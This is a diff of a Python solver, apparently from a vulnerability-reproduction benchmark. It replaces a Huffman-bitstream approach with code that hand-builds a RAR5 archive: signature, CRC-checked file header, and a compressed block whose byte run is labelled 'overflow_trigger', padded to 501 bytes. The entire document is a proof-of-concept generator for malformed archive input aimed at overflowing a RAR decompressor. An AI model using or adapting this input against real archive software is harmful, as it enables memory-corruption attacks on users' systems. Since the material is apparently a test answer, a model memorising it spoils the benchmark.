@@ -1,99 +1,78 @@
-import zlib
 import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        
+        CRC32_TABLE = [0] * 256
+        for i in range(256):
+            c = i
+            for _ in range(8):
+                if c & 1:
+                    c = 0xEDB88320 ^ (c >> 1)
+                else:
+                    c = c >> 1
+            CRC32_TABLE[i] = c
+
+        def rar_crc32(data: bytes) -> int:
+            crc = 0xFFFFFFFF
+            for byte in data:
+                crc = CRC32_TABLE[(crc ^ byte) & 0xFF] ^ (crc >> 8)
+            return (crc ^ 0xFFFFFFFF) & 0xFFFFFFFF
+
         def vint(n: int) -> bytes:
-            res = bytearray()
             if n == 0:
                 return b'\x00'
+            res = bytearray()
             while n > 0:
-                b = n & 0x7f
+                res.append(n & 0x7f)
                 n >>= 7
-                if n > 0:
-                    b |= 0x80
-                res.append(b)
+            
+            if len(res) > 1:
+                for i in range(len(res) - 1):
+                    res[i] |= 0x80
             return bytes(res)
 
-        class BitStreamWriter:
-            def __init__(self):
-                self.buf = bytearray()
-                self.bit_pos = 0
+        signature = b"\x52\x61\x72\x21\x1a\x07\x01\x00"
 
-            def write(self, bits: int, num: int):
-                val = bits
-                for _ in range(num):
-                    if self.bit_pos % 8 == 0:
-                        self.buf.append(0)
-                    if (val & 1):
-                        self.buf[-1] |= (1 << (self.bit_pos % 8))
-                    val >>= 1
-                    self.bit_pos += 1
-            
-            def write_bytes_aligned(self, data: bytes):
-                while self.bit_pos % 8 != 0:
-                    self.write(0, 1)
-                self.buf.extend(data)
-                self.bit_pos += len(data) * 8
+        block_header = b'\x80'
+        overflow_trigger = b'\x11' * 9 + b'\xf1'
 
-            def get_data(self) -> bytes:
-                return bytes(self.buf)
-
-        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
-
-        bsw = BitStreamWriter()
+        pack_size = 501
+        payload_len = 1 + len(overflow_trigger)
+        padding = b'\x00' * (pack_size - payload_len)
         
-        bsw.write(0, 1)
-        bsw.write(1, 1)
-        bsw.write(0, 1)
-        bsw.write(0, 1)
-        bsw.write(0, 1)
+        payload = block_header + overflow_trigger + padding
 
-        bsw.write(0b00, 2)
-        bsw.write(1, 4)
-
-        bsw.write(0b10, 2)
-
-        bsw.write(1, 1)
-        bsw.write(1, 1)
+        header_type = b'\x02'
+        header_flags = b'\x03'
         
-        bsw.write_bytes_aligned(vint(469))
-
-        huffman_bitstream = bsw.get_data()
+        pack_size_vint = vint(pack_size)
+        unpack_size_vint = vint(0)
         
-        block_header = vint(0x01)
-        packed_data = block_header + huffman_bitstream
-
-        packed_size = len(packed_data)
-
-        fields = bytearray()
-        fields += vint(2)
-        fields += vint(0x4024)
-        fields += vint(packed_size)
-        fields += vint(1)
-        fields += vint(0x20)
-        fields += b'\x00\x00\x00\x00'
-        fields += vint(0)
-        fields += vint(2)
-        fields += vint(len("a"))
-        fields += b"a"
-
-        header_size = vint(len(fields))
-        crc_data = header_size + fields
-        header_crc = struct.pack('<I', zlib.crc32(crc_data))
-
-        file_header = header_crc + header_size + fields
-
-        end_fields = bytearray()
-        end_fields += vint(5)
-        end_fields += vint(0x01)
+        file_flags = b'\x00'
+        compression_info = b'\x03'
+        host_os = b'\x02'
         
-        end_header_size = vint(len(end_fields))
-        end_crc_data = end_header_size + end_fields
-        end_header_crc = struct.pack('<I', zlib.crc32(end_crc_data))
-        end_header = end_header_crc + end_header_size + end_fields
+        file_name = b'a'
+        file_name_len_vint = vint(len(file_name))
         
-        poc = sig + file_header + packed_data + end_header
+        header_core_payload = (
+            header_type + header_flags + pack_size_vint + unpack_size_vint +
+            file_flags + compression_info + host_os + file_name_len_vint + file_name
+        )
+        
+        header_size = 1 + len(header_core_payload)
+        header_size_vint = vint(header_size)
+        if len(header_size_vint) > 1:
+             header_size = len(header_size_vint) + len(header_core_payload)
+             header_size_vint = vint(header_size)
 
+        file_header_payload = header_size_vint + header_core_payload
+        
+        crc = rar_crc32(file_header_payload)
+        crc_bytes = struct.pack('<I', crc)
+        
+        file_header = crc_bytes + file_header_payload
+        
+        poc = signature + file_header + payload
+        
         return poc
